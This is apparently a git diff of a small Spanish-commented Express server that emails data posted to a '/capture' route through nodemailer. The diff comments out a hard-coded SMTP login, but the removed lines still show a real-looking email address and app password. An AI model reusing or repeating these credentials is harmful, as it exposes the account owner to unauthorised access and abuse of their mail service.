@@ -15,11 +15,11 @@ const transporter = nodemailer.createTransport({
     port: 587,
     secure: false, // true para SSL, false para TLS
     auth: {
-        user: 'noreply@htk-id.com', 
-        pass: 'rypx resj ocsr yatq', 
+        //user: 'noreply@htk-id.com', 
+        //pass: 'rypx resj ocsr yatq', 
     }
 });
-
+  
 // Servir archivos estáticos (HTML, CSS)
 app.use(express.static(path.join(__dirname, 'public')));
 
@@ -51,7 +51,7 @@ app.post('/capture', (req, res) => {
         // Enviar el correo electrónico
         transporter.sendMail(mailOptions, function(error, info) {
             if (error) {
-                console.log(error);
+                console.log(error); 
             } else {
                 console.log('Correo electrónico enviado: ' + info.response);
             }
@@ -64,3 +64,4 @@ app.post('/capture', (req, res) => {
 app.listen(port, () => {
     console.log(`Servidor ejecutándose en http://localhost:${port}`);
 });
+  
